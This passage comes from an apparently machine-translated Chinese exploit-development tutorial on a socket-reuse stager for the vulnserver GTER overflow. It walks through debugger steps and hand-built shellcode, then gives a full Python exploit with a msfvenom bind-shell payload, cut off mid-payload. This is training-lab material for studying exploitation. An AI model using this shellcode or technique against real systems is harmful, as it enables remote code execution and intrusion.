set of flags that influences the behavior of this <br/>             function</span></pre><p id="d3e8" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">知道了这些，我们需要在<code class="fe lt lu lv lw b">vulnserver</code>程序中找到<code class="fe lt lu lv lw b">WS2_32.recv</code>函数。为此，让我们使用OllyDbg的内存映射模块来分析<code class="fe lt lu lv lw b">vulnserver</code>的代码区域。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/1c99b5970611e49923ed49357b244cd5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*eD6KfxMAVDs_MF5WLdG55w.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">OllyDbg存储器映射</figcaption></figure><p id="3a5d" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">向下滚动一点，你可以在<code class="fe lt lu lv lw b">0x00401953</code>找到<code class="fe lt lu lv lw b">WS2_32.recv</code>函数的存储位置。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi po"><img src="../Images/b10ce18077bf3c77536bcbc18531e533.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QoOagQ0eZnOQWMSiraStag.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">WS2_32.recv</figcaption></figure><p id="3018" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为了获得文件描述符值，让我们在<code class="fe lt lu lv lw b">0x00401953</code>的<code class="fe lt lu lv lw b">WS2_32.recv</code>函数位置设置一个断点，并运行我们的PoC脚本<em class="nc"> first_stage_gter.py. </em></p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/944ee9eed79c9c98f7b4a0071d1108de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*R6mcXKOOHrv21btcPmSxrg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">在0x00401953处设置断点</figcaption></figure><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pq"><img src="../Images/d5129fb03a53933511a30bd180741ad1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vGBjDUx176PBhRroxhEC0Q.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">套接字文件描述符</figcaption></figure><p id="a168" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">当它命中断点时，我们可以清楚地看到代表<code class="fe lt lu lv lw b">recv</code>函数语法的堆栈。但是有一点需要注意的是，套接字存储的地址每次都可能会改变(<em class="nc">*您可以尝试重复相同的步骤来验证这一点</em>)。所以基本上不是硬编码文件描述符地址，我们需要通过计算从<code class="fe lt lu lv lw b">ESP</code>到当前地址的距离来动态检索它。</p><p id="146f" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为此，我们需要在存储套接字当前地址的<code class="fe lt lu lv lw b">ESP</code>之前获取<code class="fe lt lu lv lw b">ESP</code>地址。我们可以简单地发现第一个<code class="fe lt lu lv lw b">ESP</code>地址就在<code class="fe lt lu lv lw b">WS2_32.recv</code>函数的上方，这里有<code class="fe lt lu lv lw b">mov EAX, PTR [EBP-420]</code> → <code class="fe lt lu lv lw b">mov ESP, EAX </code>指令。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pr"><img src="../Images/15809a84d09b15fd7d7daf8c8e5c0c1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*cvb_0UsD1Zufmffrvn3SFw.png"/></div></figure><p id="e106" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们检查一下<code class="fe lt lu lv lw b">[EBP-420]</code>地址在哪里。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/88ff3b8c72bea22170e9aca894eff758.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/format:webp/1*fkvjGDb1uCLV2O5lZu9znw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">转到[EBP-420]</figcaption></figure><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/fee1cdcf4457e6e4dc5fc06e84de447c.png" data-original-src="https://miro.medium.com/v2/resize:fit:920/format:webp/1*nZVS79bIMVH31ANDNecoog.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">[EBP-420] = 0x0176FB68</figcaption></figure><p id="6e2f" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为了计算距离，</p><p id="f216" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated"><code class="fe lt lu lv lw b">First ESP (0x0176FB68) — Address of Socket ESP (0x0176F9E0) = 0x188</code></p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pu"><img src="../Images/2fb41c2a9e8545bf5c9612dedfe74f43.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*f7zETnmUmAu_OR6jsBU8Dg.png"/></div></figure><p id="58b4" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">所以插座会在<code class="fe lt lu lv lw b">ESP + 0x188</code>找到。这将动态地找到文件描述符的地址。</p><p id="71f7" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们用操作码来创建它:</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="3aff" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Finding File Descriptor (ASM)</strong></span><span id="9a8a" class="nz jy it lw b gy os ob l oc od">PUSH ESP      <strong class="lw iu">; Push ESP on the stack</strong><br/>POP EAX       <strong class="lw iu">; POP ESP into EAX</strong><br/>ADD AX, 0x188 <strong class="lw iu">; Add 0x188 to EAX to align it to address of socket <br/>                ESP (58 in our example)</strong><br/>PUSH [EAX]    <strong class="lw iu">; Push address of EAX on the stack</strong><br/>POP ESI       <strong class="lw iu">; POP the address of EAX into ESI to save the register</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/71c39ba81770855944b88a2abc3bd87e.png" data-original-src="https://miro.medium.com/v2/resize:fit:882/format:webp/1*AU5zsnGfib6gwZDvUDBOwQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">文件描述符</figcaption></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="873a" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Finding File Descriptor (Shellcode)</strong></span><span id="6da1" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI</span></pre></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="4392" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">堆栈指针调整</h2><p id="c68e" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">当我们在上面的文件描述符中查找外壳代码时，我们可以成功地看到<code class="fe lt lu lv lw b">58</code>确实位于我们的<code class="fe lt lu lv lw b">ESI</code>寄存器中；但是，我们可以注意到我们的<code class="fe lt lu lv lw b">EIP</code>地址太靠近当前的<code class="fe lt lu lv lw b">ESP</code>，这可能会影响我们未来的stager代码被覆盖。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pw"><img src="../Images/478c0c53d9c23c33fb16d5a7fd6efdc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CYnMRlLOFow2jFQGAMUPTg.png"/></div></div></figure><p id="7451" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为了避免这种情况，我们可以通过执行以下操作来减少ESP中的一些堆栈指针。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="0353" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Stack Pointer Adjustment (ASM)</strong></span><span id="d23e" class="nz jy it lw b gy os ob l oc od">SUB ESP, 0x74       <strong class="lw iu">; 116 bytes</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi px"><img src="../Images/9c456243370f3934a801f55020ccedd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0BHSDWTdgYxKe5GGGVYoBA.png"/></div></div></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="bff9" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### Stack Pointer Adjustment (Shellcode Cont'd)</strong></span><span id="1233" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI<br/><strong class="lw iu">\x83\xEC\x74          # SUB ESP, 0x74</strong></span></pre></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="2d9c" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">接收(标志和长度)</h2><p id="e57d" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">接下来，我们需要按照其余的<code class="fe lt lu lv lw b">recv</code>语法推送所有数据。我们将首先把<code class="fe lt lu lv lw b">0</code>压入堆栈来设置flags参数。然后，我们将添加<code class="fe lt lu lv lw b">512</code>字节(<code class="fe lt lu lv lw b">0x200</code>)的缓冲区大小，这对于我们的bind shell有效负载来说足够了。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="5861" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### recv - Flags &amp; Len (ASM)</strong></span><span id="4d67" class="nz jy it lw b gy os ob l oc od">XOR EBX, EBX        <strong class="lw iu">; Zero out EBX</strong><br/>PUSH EBX            <strong class="lw iu">; Push EBX onto the stack (Set for <em class="nc">Flags</em>)</strong><br/>ADD BH, 0x2         <strong class="lw iu">; Set EBX to 0x00000200</strong><br/>PUSH EBX            <strong class="lw iu">; Push EBX onto the stack (Set for <em class="nc">Len</em>)</strong></span></pre><p id="5f4b" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">让我们把这些添加到外壳代码中。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi py"><img src="../Images/b62638c8a44101a4e5c0d8c1fd1619b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sQvIOaOBn6f_2hia6YKVkQ.png"/></div></div></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="8024" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### recv - Flags &amp; Len (Shellcode Cont'd)</strong></span><span id="7964" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI<br/>\x83\xEC\x74          # SUB ESP, 0x74<br/><strong class="lw iu">\x33\xDB              # XOR EBX, EBX<br/>\x53                  # PUSH EBX<br/>\x80\xC7\x02          # ADD BH, 0x2<br/>\x53                  # PUSH EBX</strong></span></pre></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="6150" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">接收(缓冲器和插座)</h2><p id="fbdd" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">接下来，我们需要将我们的执行重定向到<code class="fe lt lu lv lw b">recv</code>缓冲区的位置。我们现在的ESP是<code class="fe lt lu lv lw b">0x0172F964</code>。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pz"><img src="../Images/594f1434d63ba4d9af64b801b703cc71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ugKMC6mW-5utlt9qA0kSAw.png"/></div></div></figure><p id="dd7d" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">我们想在recv buffer参数所在的地址<code class="fe lt lu lv lw b">0x172F9DC</code>上继续我们的执行流程。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/0182b3e11ae750367ca18abdef0d67f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/format:webp/1*fkZr6PwuDz2Ue4_CTTRAGQ.png"/></div></figure><p id="3533" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">为此，我们可以简单地将<code class="fe lt lu lv lw b">ESP</code>推送到堆栈上，并将其弹出到<code class="fe lt lu lv lw b">EBX</code>中，通过将<code class="fe lt lu lv lw b">0x78</code>添加到<code class="fe lt lu lv lw b">EBX</code>并将调整后的<code class="fe lt lu lv lw b">EBX</code>推送到堆栈上，我们可以更新<code class="fe lt lu lv lw b">the ESP</code>地址以指向<code class="fe lt lu lv lw b">recv</code>缓冲区参数。然后，最后，我们将把当前保存文件描述符(在我们的例子中是58)的值的<code class="fe lt lu lv lw b">ESI</code>寄存器推到堆栈上，以完成<code class="fe lt lu lv lw b">recv</code>函数。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="2fd5" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### recv - Buf &amp; File Descriptor (ASM)</strong></span><span id="96f4" class="nz jy it lw b gy os ob l oc od">PUSH ESP            <strong class="lw iu">; Push the current ESP onto the stack</strong><br/>POP EBX             <strong class="lw iu">; Pop the ESP in EBX register</strong><br/>ADD EBX, 0x78       <strong class="lw iu">; Adjust the ESP value by adding 0x78</strong><br/>PUSH EBX            <strong class="lw iu">; recv parameter - char *buf</strong><br/>PUSH ESI            <strong class="lw iu">; recv parameter - SOCKET s (File Descriptor)</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi qa"><img src="../Images/4750b04b08913e31bd2b6779e02da151.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VaNaFts54L8XMZQNI8vURw.png"/></div></div></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="e0f3" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### recv - Buf &amp; File Descriptor (Shellcode Cont'd)</strong></span><span id="4681" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI<br/>\x83\xEC\x74          # SUB ESP, 0x74<br/>\x33\xDB              # XOR EBX, EBX<br/>\x53                  # PUSH EBX<br/>\x80\xC7\x02          # ADD BH, 0x2<br/>\x53                  # PUSH EBX<strong class="lw iu"><br/>\x54                  # PUSH ESP<br/>\x5B                  # POP EBX<br/>\x83\xC3\x78          # ADD EBX, 0x78<br/>\x53                  # PUSH EBX<br/>\x56                  # PUSH ESI</strong></span></pre></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="c573" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">调用第一接收函数</h2><p id="4f9e" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">最后，我们现在需要在<code class="fe lt lu lv lw b">0x0040252C</code>处调用<code class="fe lt lu lv lw b">&lt;JMP.&amp;WS2_32.recv&gt;</code>函数。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi qb"><img src="../Images/8324803d70446cafe0f31f0d88daa09f.png" data-original-src="https://miro.medium.com/v2/resize:fit:824/format:webp/1*J56yUUNSD0wlVfJr03l9qw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated"><jmp./></figcaption></figure><p id="1cd0" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">我们可以简单地将该地址形成堆栈，但是我们可以看到一个问题，位置是从<code class="fe lt lu lv lw b">\x00</code>开始的。正如@rastating建议的那样，我们可以像下面这样绕过空字节:</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="2fec" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### 1st &lt;JMP.&amp;WS2_32.recv&gt; (ASM)</strong></span><span id="5998" class="nz jy it lw b gy os ob l oc od">MOV EBX, 0x40252C11     <strong class="lw iu">; Use this address instead of 0x0040252C</strong><br/>SHR EBX, 8              <strong class="lw iu">; Shift EAX to the right by 8 bits = 1 byte</strong><br/>CALL EBX                <strong class="lw iu">; Call EAX</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/3ba262f9f153a1ac8b04d0021373d66f.png" data-original-src="https://miro.medium.com/v2/resize:fit:868/format:webp/1*sQ_aXF25WNziZZAtU2oBAw.png"/></div></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="3333" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### 1st &lt;JMP.&amp;WS2_32.recv&gt; (Shellcode Cont'd)</strong></span><span id="a350" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI<br/>\x83\xEC\x74          # SUB ESP, 0x74<br/>\x33\xDB              # XOR EBX, EBX<br/>\x53                  # PUSH EBX<br/>\x80\xC7\x02          # ADD BH, 0x2<br/>\x53                  # PUSH EBX<strong class="lw iu"><br/></strong>\x54                  # PUSH ESP<br/>\x5B                  # POP EBX<br/>\x83\xC3\x78          # ADD EBX, 0x78<br/>\x53                  # PUSH EBX<br/>\x56                  # PUSH ESI<br/><strong class="lw iu">\xBB\x11\x2C\x25\x40  # MOV EBX, 0x40252C11<br/>\xC1\xEB\x08          # SHR EBX, 8 <br/>\xFF\xD3              # CALL EBX   </strong>           </span></pre><p id="7ba2" class="pw-post-body-paragraph kv kw it kx b ky mx la lb lc my le lf lg mz li lj lk na lm ln lo nb lq lr ls im bi translated">一旦我们用最后的加法单步执行了操作码，我们就可以用我们的修改成功地调用<code class="fe lt lu lv lw b">WS2_32.recv</code>函数。</p><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ca"><img src="../Images/189357e1069e87dfb2d25a2090c673a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jG9BY7fgx23KFsG1OJMDog.png"/></div></div></figure></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h2 id="8b27" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">调用第二接收函数</h2><p id="21b4" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">因为我们将我们的bind shell有效负载作为套接字重用有效负载发送，所以我们需要进行第二次recv调用来正确地触发我们的bind shell。</p><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="5a4a" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### 2nd &lt;JMP.&amp;WS2_32.recv&gt; (ASM)</strong></span><span id="f161" class="nz jy it lw b gy os ob l oc od">XOR ECX, ECX    <strong class="lw iu">; Zero out ECX</strong><br/>PUSH ECX        <strong class="lw iu">; recv flags parameter = 0</strong><br/>PUSH EAX        <strong class="lw iu">; recv len parameter = 0x200</strong><br/>PUSH EBX        <strong class="lw iu">; recv buf parameter</strong><br/>PUSH ESI        <strong class="lw iu">; recv SOCKET s parameter</strong><br/>CALL EBX        <strong class="lw iu">; Call &lt;JMP.&amp;WS2_32.recv&gt;</strong></span></pre><figure class="ni nj nk nl gt ju gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/ca45a1c4f273ff8a4005172213cdde4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:876/format:webp/1*8Xq2Yo77pgpimpQoi1oeyA.png"/></div></figure><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="e4e0" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### 2nd &lt;JMP.&amp;WS2_32.recv&gt; (Shellcode Cont'd)</strong></span><span id="07e0" class="nz jy it lw b gy os ob l oc od">\x54                  # PUSH ESP<br/>\x58                  # POP EAX<br/>\x66\x05\x88\x01      # ADD AX, 0x188 <br/>\xFF\x30              # PUSH [EAX]<br/>\x5E                  # POP ESI<br/>\x83\xEC\x74          # SUB ESP, 0x74<br/>\x33\xDB              # XOR EBX, EBX<br/>\x53                  # PUSH EBX<br/>\x80\xC7\x02          # ADD BH, 0x2<br/>\x53                  # PUSH EBX<strong class="lw iu"><br/></strong>\x54                  # PUSH ESP<br/>\x5B                  # POP EBX<br/>\x83\xC3\x78          # ADD EBX, 0x78<br/>\x53                  # PUSH EBX<br/>\x56                  # PUSH ESI<br/>\xBB\x11\x2C\x25\x40  # MOV EBX, 0x40252C11<br/>\xC1\xEB\x08          # SHR EBX, 8 <br/>\xFF\xD3              # CALL EBX<br/><strong class="lw iu">\x33\xC9              # XOR ECX, ECX<br/>\x51                  # PUSH ECX<br/>\x50                  # PUSH EAX<br/>\x53                  # PUSH EBX<br/>\x56                  # PUSH ESI<br/>\xFF\xD3              # CALL EBX</strong></span></pre></div><div class="ab cl lx ly hx lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="im in io ip iq"><h1 id="ca8d" class="jx jy it bd jz ka me kc kd ke mf kg kh ki mg kk kl km mh ko kp kq mi ks kt ku bi translated">第三阶段外壳代码(绑定外壳)</h1><p id="1f56" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们都设置了第二阶段的套接字重用外壳代码。让我们用msfvenom创建一个绑定shell，并用我们的PoC脚本更新它。</p><h2 id="cb2e" class="nz jy it bd jz of og dn kd oh oi dp kh lg oj ok kl lk ol om kp lo on oo kt op bi translated">最终利用</h2><pre class="ni nj nk nl gt nv lw nw nx aw ny bi"><span id="15b5" class="nz jy it lw b gy oa ob l oc od"><strong class="lw iu">### </strong><a class="ae nd" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GTER%20-%20EIP%20Overwrite/final_gter.py" rel="noopener ugc nofollow" target="_blank"><strong class="lw iu">Final_gter.py</strong></a><strong class="lw iu"> (Source by bigb0ss)</strong></span><span id="62bd" class="nz jy it lw b gy os ob l oc od">import socket<br/>import struct<br/>import os<br/>import sys<br/>import time</span><span id="9b97" class="nz jy it lw b gy os ob l oc od">vuln_command = "GTER "<br/>crash = 160<br/>offset = 151<br/>eip = struct.pack("&lt;I", 0x62501205)     <strong class="lw iu"># JMP ESP</strong></span><span id="b184" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu"># 1st Stage Shellcode (Short JMP)</strong><br/>jmp_back = "\x54\x59\x83\xE9\x64\xFF\xE1"</span><span id="0eb2" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu"># 2nd Stage Shellcode (Socket Reuse Exploit)</strong><br/>socket_reuse = ""<br/>socket_reuse += "\x54"                  <strong class="lw iu"># PUSH ESP</strong><br/>socket_reuse += "\x58"                  <strong class="lw iu"># POP EAX</strong><br/>socket_reuse += "\x66\x05\x88\x01"      <strong class="lw iu"># ADD AX, 0x188 </strong><br/>socket_reuse += "\xFF\x30"              <strong class="lw iu"># PUSH [EAX]</strong><br/>socket_reuse += "\x5E"                  <strong class="lw iu"># POP ESI</strong><br/>socket_reuse += "\x83\xEC\x74"          <strong class="lw iu"># SUB ESP, 0x74</strong><br/>socket_reuse += "\x33\xDB"              <strong class="lw iu"># XOR EBX, EBX</strong><br/>socket_reuse += "\x53"                  <strong class="lw iu"># PUSH EBX</strong><br/>socket_reuse += "\x80\xC7\x02"          <strong class="lw iu"># ADD BH, 0x2</strong><br/>socket_reuse += "\x53"                  <strong class="lw iu"># PUSH EBX</strong><br/>socket_reuse += "\x54"                  <strong class="lw iu"># PUSH ESP</strong><br/>socket_reuse += "\x5B"                  <strong class="lw iu"># POP EBX</strong><br/>socket_reuse += "\x83\xC3\x78"          <strong class="lw iu"># ADD EBX, 0x78</strong><br/>socket_reuse += "\x53"                  <strong class="lw iu"># PUSH EBX</strong><br/>socket_reuse += "\x56"                  <strong class="lw iu"># PUSH ESI</strong><br/>socket_reuse += "\xBB\x11\x2C\x25\x40"  <strong class="lw iu"># MOV EBX, 0x40252C11</strong><br/>socket_reuse += "\xC1\xEB\x08"          <strong class="lw iu"># SHR EBX, 8</strong> <br/>socket_reuse += "\xFF\xD3"              <strong class="lw iu"># CALL EBX</strong><br/>socket_reuse += "\x33\xC9"             <strong class="lw iu"> # XOR ECX, ECX</strong><br/>socket_reuse += "\x51"                  <strong class="lw iu"># PUSH ECX</strong><br/>socket_reuse += "\x50"                  <strong class="lw iu"># PUSH EAX</strong><br/>socket_reuse += "\x53"                  <strong class="lw iu"># PUSH EBX</strong><br/>socket_reuse += "\x56"                  <strong class="lw iu"># PUSH ESI</strong><br/>socket_reuse += "\xFF\xD3"              <strong class="lw iu"># CALL EBX</strong></span><span id="f665" class="nz jy it lw b gy os ob l oc od"><strong class="lw iu"># 3rd Stage Shellcode (Bind Shell) - Port 443 (355 Bytes)</strong><br/>buf =  ""<br/>buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"<br/>buf += "\xc9\xb1\x53\x31\x42\x17\x83\xc2\x04\x03\xe8\xb3\xda"<br/>buf += "\x86\x10\x5b\x98\x69\xe8\x9c\xfd\xe0\x0d\xad\x3d\x96"<br/>buf += "\x46\x9e\x8d\xdc\x0a\x13\x65\xb0\xbe\xa0\x0b\x1d\xb1"<br/>buf += "\x01\xa1\x7b\xfc\x92\x9a\xb8\x9f\x10\xe1\xec\x7f\x28"<br/>buf += "\x2a\xe1\x7e\x6d\x57\x08\xd2\x26\x13\xbf\xc2\x43\x69"<br/>buf += "\x7c\x69\x1f\x7f\x04\x8e\xe8\x7e\x25\x01\x62\xd9\xe5"<br/>buf += "\xa0\xa7\x51\xac\xba\xa4\x5c\x66\x31\x1e\x2a\x79\x93"<br/>buf += "\x6e\xd3\xd6\xda\x5e\x26\x26\x1b\x58\xd9\x5d\x55\x9a"<br/>buf += "\x64\x66\xa2\xe0\xb2\xe3\x30\x42\x30\x53\x9c\x72\x95"<br/>buf += "\x02\x57\x78\x52\x40\x3f\x9d\x65\x85\x34\x99\xee\x28"<br/>buf += "\x9a\x2b\xb4\x0e\x3e\x77\x6e\x2e\x67\xdd\xc1\x4f\x77"<br/>buf += "\xbe\xbe\xf5\xfc\x53\xaa\x87\x5f\x3c\x1f\xaa\x5f\xbc"<br/>buf += "\x37\xbd\x2c\x8e\x98\x15\xba\xa2\x51\xb0\x3d\xc4\x4b"<br/>buf += "\x04\xd1\x3b\x74\x75\xf8\xff\x20\x25\x92\xd6\x48\xae"<br/>buf += "\x62\xd6\x9c\x5b\x6a\x71\x4f\x7e\x97\xc1\x3f\x3e\x37"<br/>buf += "\xaa\x55\xb1\x68\xca\x55\x1b\x01\x63\xa8\xa4\x2c\xcf"<br/>buf += "\x25\x42\x44\x3f\x60\xdc\xf0\xfd\x57\xd5\x67\xfd\xbd"<br/>buf += "\x4d\x0f\xb6\xd7\x4a\x30\x47\xf2\xfc\xa6\xcc\x11\x39"<br/>buf += "\xd7\xd2\x3f\x69\x80\x45\xb5\xf8\xe3\xf4\xca\xd0\x93"<br/>buf += 